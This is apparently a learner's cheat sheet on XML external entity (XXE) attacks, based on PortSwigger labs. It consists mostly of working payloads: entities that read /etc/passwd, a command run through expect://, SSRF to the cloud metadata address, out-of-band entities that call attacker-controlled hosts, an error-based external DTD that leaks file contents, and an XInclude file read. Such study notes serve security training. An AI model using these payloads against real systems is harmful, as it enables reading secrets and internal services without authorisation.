# xml external entities (xxe)

  

## what is xml : extensible markup language

  

## simple payload :

```xml

<! DOCTYPE foo [ <!ELEMENT foo ANY >

<! ENTITY xxe SYSTEM "file:///etc/passwd" >]>

  

<creds>

 <user>

    &xxe;

 </user>

 <pass>

    password

 </pass>

</creds>

  

<?xml version="1.0" ?-->

```

  

```xml

<! DOCTYPE replace [<!ENTITY test "hello world"> ]>

  

<foo>

 <user>

    &test;

 </user>

</foo>

```

  

```xml

<?xml version="1.0" ?-->

<! DOCTYPE replace [<!ENTITY test SYSTEM "expect:///ls"> ]>

```

  

```xml

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

```

  

---

  

Entity let's say it like a variable  

Document type definition(DTD) define the Entities (DOCTYPE ..........)  

The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.

  

the declaration of external entity uses the SYSTEM keyword

  

```xml

<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>

```

  

you can make it an ssrf by :

```xml

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>

```

  

---

  

## blind :

if regular entities are blocked , try this :

```xml

<!ENTITY % myparameterentity "my parameter entity value" >

%myparameterentity;

```

  

```xml

<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>

```

  

---

  

## Types :

- inband : the common type which display the output on the screen.  

- error based : this type is parsing the XML and you can see just Eroors.  

- out of band (oob) : this type is blind without any errors or results, you can do some

 requests to check it.

  

---

  

## Blind XXE with out-of-band interaction :

```xml

<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>

&xxe;

```

  

## Blind XXE with out-of-band interaction via XML parameter entities :

```xml

<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>

```

  

---

  

## Exploiting blind XXE to exfiltrate data using a malicious external DTD :

waw , just repeat the lab in portswigger

  

---

  

### Exploiting blind XXE to retrieve data via error messages :

  

amazing idea when we retrive the data in a error message , we use a simple external DTD , and call it with a link in the xml request , we build an error in the DTD to see the data in the response , waw.

  

### the payloads :

  

#### the DTD :

```dtd

<!ENTITY % file SYSTEM "file:///etc/passwd">

<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">

%eval;

%exfil;

```

  

#### the request :

ofcorse with the other xml :

```xml

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ae900530498c3b188572fd7014600bd.exploit-server.net/exploit"> %xxe;]>

```

  

## Exploiting XInclude to retrieve files :

  

when you dont have the xml in the request , but you know that the website use xml , and you can manipulate a parameter in the xml : try this :

  

in the parameter :

  

```xml

parameter=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

```